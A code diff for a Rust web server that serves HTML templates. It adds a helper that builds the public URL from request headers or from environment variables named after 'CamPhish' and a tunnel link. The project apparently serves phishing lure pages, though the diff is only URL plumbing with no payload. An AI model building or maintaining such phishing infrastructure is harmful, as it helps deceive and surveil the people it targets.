@@ -1,6 +1,7 @@
 use crate::AppState;
 use axum::extract::{Path, State};
 use axum::http::header;
+use axum::http::HeaderMap;
 use axum::http::StatusCode;
 use axum::response::Response;
 use heck::ToTitleCase;
@@ -39,16 +40,20 @@ pub async fn scan_and_register(state: &Arc<AppState>) -> anyhow::Result<()> {
 pub async fn serve_template(
     State(state): State<Arc<AppState>>,
     Path(template_id): Path<String>,
+    headers: HeaderMap,
 ) -> Result<Response, StatusCode> {
     // Check cache first
     if let Some(cached) = state.get_cached_template(&template_id).await {
+        let forwarding_link = resolve_public_url(&headers);
+        let api_base = if forwarding_link.is_empty() { "/api".to_string() } else { format!("{}/api", forwarding_link) };
+        let processed = cached.replace("API_BASE_URL", &api_base).replace("forwarding_link", &forwarding_link);
         let pool = state.pool.clone();
         let tid = template_id.clone();
         tokio::spawn(async move {
             let _ = sqlx::query("UPDATE templates SET total_served = total_served + 1 WHERE id = ?")
                 .bind(&tid).execute(&pool).await;
         });
-        let mut resp = Response::new(cached.into());
+        let mut resp = Response::new(processed.into());
         resp.headers_mut().insert(header::CONTENT_TYPE, "text/html; charset=utf-8".parse().unwrap());
         resp.headers_mut().insert(header::CACHE_CONTROL, "no-cache".parse().unwrap());
         return Ok(resp);
@@ -90,15 +95,15 @@ pub async fn serve_template(
     let processed = if is_js_template {
         content
     } else {
-        let tunnel_link = std::env::var("TUNNEL_LINK").unwrap_or_default();
-        let api_base = if tunnel_link.is_empty() {
+        let forwarding_link = resolve_public_url(&headers);
+        let api_base = if forwarding_link.is_empty() {
             "/api".to_string()
         } else {
-            format!("{}/api", tunnel_link)
+            format!("{}/api", forwarding_link)
         };
         content
             .replace("API_BASE_URL", &api_base)
-            .replace("forwarding_link", &tunnel_link)
+            .replace("forwarding_link", &forwarding_link)
     };
 
     // Cache for future requests
@@ -121,6 +126,20 @@ pub async fn serve_template(
     resp.headers_mut().insert(header::CONTENT_TYPE, content_type.parse().unwrap());
     resp.headers_mut().insert(header::CACHE_CONTROL, "no-cache".parse().unwrap());
     Ok(resp)
+}
+
+fn resolve_public_url(headers: &HeaderMap) -> String {
+    let host = headers.get("Host").and_then(|v| v.to_str().ok()).map(|s| s.to_string());
+    let forwarded_proto = headers.get("X-Forwarded-Proto").and_then(|v| v.to_str().ok()).unwrap_or("http");
+    let request_origin = host.map(|host| format!("{}://{}", forwarded_proto, host));
+
+    request_origin
+        .or_else(|| std::env::var("SERVICE_URL_CAMPHISH").ok().filter(|v| !v.is_empty()))
+        .or_else(|| std::env::var("SERVICE_FQDN_CAMPHISH_8080").ok().filter(|v| !v.is_empty()).map(|v| format!("https://{}", v.trim_end_matches('/'))))
+        .or_else(|| std::env::var("CAMPHISH_URL").ok().filter(|v| !v.is_empty()))
+        .or_else(|| std::env::var("TUNNEL_URL").ok().filter(|v| !v.is_empty()))
+        .or_else(|| std::env::var("TUNNEL_LINK").ok().filter(|v| !v.is_empty()))
+        .unwrap_or_default()
 }
 
 fn get_template_description(path: &std::path::Path) -> Option<String> {
